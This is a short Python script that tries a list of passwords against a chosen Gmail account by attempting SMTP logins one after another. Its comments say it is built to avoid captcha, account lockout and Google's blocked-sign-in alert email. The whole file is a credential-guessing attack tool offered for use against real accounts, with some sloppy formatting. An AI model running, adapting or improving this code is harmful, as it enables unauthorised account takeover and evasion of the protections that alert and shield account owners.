#this script is useful for testing a limited amount of passwords without having to fill out captcha 
#or locking the account. It also avoids, as far as I can see, triggering the "blocked sign in attempt" 
#email. 
#You will still get blocked after a certain number of attempts, so it's not suited for brute-forcing
#or dictionary attacks

import smtplib
import getpass
from email.mime.text import MIMEText

def sendmail(email, pwd):

	print pwd

	try:
		smtpserver=smtplib.SMTP('smtp.gmail.com',587)
        	smtpserver.starttls()
        	smtpserver.login(email,pwd)
        	print('password found: {}'.format(pwd))
		return 1;
	except:
		return 0;
def main():
	email=raw_input("enter the email address\n")

	f = open('passwords.txt', 'r')
	for line in f:
		if(sendmail(email,line) == 1):
			break
       
if __name__ == '__main__':
	main()
